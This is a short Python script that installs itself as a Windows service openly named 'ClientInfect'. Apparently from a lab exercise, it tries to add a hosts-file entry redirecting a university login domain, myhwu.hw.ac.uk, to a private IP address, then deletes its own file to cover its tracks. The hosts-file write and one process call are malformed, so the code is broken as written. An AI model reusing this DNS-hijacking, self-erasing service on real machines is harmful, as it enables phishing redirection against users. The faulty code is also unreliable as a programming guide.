import win32serviceutil
import win32service
import win32event
import servicemanager
import socket
import sys, subprocess 


class AppServerSvc (win32serviceutil.ServiceFramework):
    _svc_name_ = "ClientInfect"
    _svc_display_name_ = "DNS Client Infect"

    def __init__(self,args):
        win32serviceutil.ServiceFramework.__init__(self,args)
        self.hWaitStop = win32event.CreateEvent(None,0,0,None)
        socket.setdefaulttimeout(60)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_,''))
        self.main()

    def main(self):
        hosts_path = "C:\Windows\System32\drivers\etc\hosts"
        subprocess.Popen("10.0.2.4  myhwu.hw.ac.uk" >> {}, hosts_path)
        subprocess.Popen("python -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(sys.argv[0]))
        sys.exit(0)
            # https://bit.ly/3wV8Ecg

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(AppServerSvc)